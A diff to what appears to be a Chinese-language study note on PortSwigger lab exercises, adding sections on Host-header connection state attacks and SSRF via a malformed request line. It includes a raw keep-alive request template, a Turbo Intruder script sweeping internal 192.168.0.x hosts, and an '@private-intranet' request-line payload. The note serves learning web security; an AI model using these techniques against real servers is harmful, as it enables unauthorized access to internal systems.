@@ -370,12 +370,75 @@ Content-Length: 53
 username=carlos&csrf=yhtElho6i4chrQiFn6lyr30BaTBOMvbx
 ```
 
+## Connection state attacks
+
+這邊講到的就是 [Keep-Alive 和 Connection](../http/keep-alive-and-connection.md) 的機制，漏洞點是
+
+```
+Poorly implemented HTTP servers sometimes work on the dangerous assumption that certain properties, such as the Host header, are identical for all HTTP/1.1 requests sent over the same connection.
+```
+
 ## Lab: Host validation bypass via connection state attack
 
 | Dimension | Description                                                                                                                    |
 | --------- | ------------------------------------------------------------------------------------------------------------------------------ |
 | Document  | https://portswigger.net/web-security/host-header/exploiting#connection-state-attacks                                           |
 | Lab       | https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack |
+
+這題剛好踩到我研究過的領域，所以解題沒難度，只是 Burp Intruder 似乎無法達到我想要的控制，所以我下載 Turbo Intruder 來用，結果要寫 Python Script！
+
+總之，不管用啥工具，概念就是先送一個正常的 HTTP Request（記得要 `Connection: keep-alive`），之後在 Server 回傳的 `Keep-Alive: timeout=10` 秒之內，用同一條 TCP connection 去送 exploit HTTP Request（`Host: 192.168.0.x`）
+
+```
+GET / HTTP/1.1
+Host: %s
+Cookie: session=w0KPoHGC8dIA3RE6nNS8YTa2fyze1iDB; _lab=46%7cMCwCFEX3hqfXEGkXP2z%2fM4cFhL8Y3eDDAhRN4wIaILClMhwLkVyp9HLZSro1IV9nouJhDskqX7youwWiIoAtH3MCLhmX7rV8ksXy4e23KguNy2Usnnyd6rmF5YvG1bHQBFUpql6d7JJlDhN76UQcaGSZqDx3jgRimjhZRO3yTXd%2fnqAwOnk%3d
+Connection: keep-alive
+```
+
+```python
+# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                          concurrentConnections=1,
+                          requestsPerConnection=257)
+
+    # 第一個 request: innocent host
+    engine.queue(target.req, '0a5000f103d4bc0c8377384000e8008e.h1-web-security-academy.net')
+
+    # 接下來 256 個 requests: 內網 IPs
+    for i in range(256):
+        engine.queue(target.req, '192.168.0.{}'.format(i))
+
+    engine.start()
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+好不容易成功跑起來後，我才發現題目有說 `To solve the lab, exploit this behavior to access an internal admin panel located at 192.168.0.1/admin`，所以根本不需要猜 0 ~ 255 這段，笑死
+
+已知 `192.168.0.1` 的情況，其實直接用 Postman 也行，預設會 reuse keep-alive connection，接下來的解法就跟上面那題一樣了～
+
+## SSRF via a malformed request line
+
+https://portswigger.net/web-security/host-header/exploiting#ssrf-via-a-malformed-request-line
+
+假設
+
+```
+GET /example HTTP/1.1
+```
+
+Reverse Proxy 會把它轉發到 `http://internal-backend/example`
+
+那
+
+```
+GET @private-intranet/example HTTP/1.1
+```
+
+就會變成 `http://internal-backend@private-intranet/example`，其中 `internal-backend` 就變成 username，我們就可以控制 `private-intranet/example` 來訪問內網資源
 
 ## 參考資料
 
